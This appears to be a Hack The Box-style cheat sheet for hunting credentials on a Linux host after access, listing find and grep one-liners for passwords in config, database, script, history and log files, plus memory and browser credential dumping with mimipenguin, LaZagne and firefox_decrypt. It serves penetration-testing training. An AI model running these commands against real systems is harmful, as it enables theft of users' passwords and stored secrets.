## Files
#### Searching for configuration files

```shell
3kjS@htb[/htb]$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

```shell
3kjS@htb[/htb]$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
#### Searching for databases

```shell
3kjS@htb[/htb]$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
#### Searching for notes

```shell
3kjS@htb[/htb]$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
#### Searching for scripts

```shell
3kjS@htb[/htb]$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
#### Enumerating cronjobs

```shell
3kjS@htb[/htb]$ cat /etc/crontab

3kjS@htb[/htb]$ ls -la /etc/cron.*/
```
#### Enumerating history files

```shell
3kjS@htb[/htb]$ tail -n5 /home/*/.bash*
```
#### Enumerating log files
|**File**|**Description**|
|---|---|
|`/var/log/messages`|Generic system activity logs.|
|`/var/log/syslog`|Generic system activity logs.|
|`/var/log/auth.log`|(Debian) All authentication related logs.|
|`/var/log/secure`|(RedHat/CentOS) All authentication related logs.|
|`/var/log/boot.log`|Booting information.|
|`/var/log/dmesg`|Hardware and drivers related information and logs.|
|`/var/log/kern.log`|Kernel related warnings, errors and logs.|
|`/var/log/faillog`|Failed login attempts.|
|`/var/log/cron`|Information related to cron jobs.|
|`/var/log/mail.log`|All mail server related logs.|
|`/var/log/httpd`|All Apache related logs.|
|`/var/log/mysqld.log`|All MySQL server related logs.|

```shell
3kjS@htb[/htb]$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
## Memory and cache
#### Mimipenguin

```shell
3kjS@htb[/htb]$ sudo python3 mimipenguin.py 
[SYSTEM - GNOME] cry0l1t3:WLpAEXFa0SbqOHY
```
#### LaZagne

```shell
3kjS@htb[/htb]$ sudo python2.7 laZagne.py all
```
#### Browser credentials

```shell
[!bash]$ ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release 

drwx------ 2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```

```shell
3kjS@htb[/htb]$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

```shell
3kjS@htb[/htb]$ python3.9 firefox_decrypt.py
```

```shell
3kjS@htb[/htb]$ python3 laZagne.py browsers
```
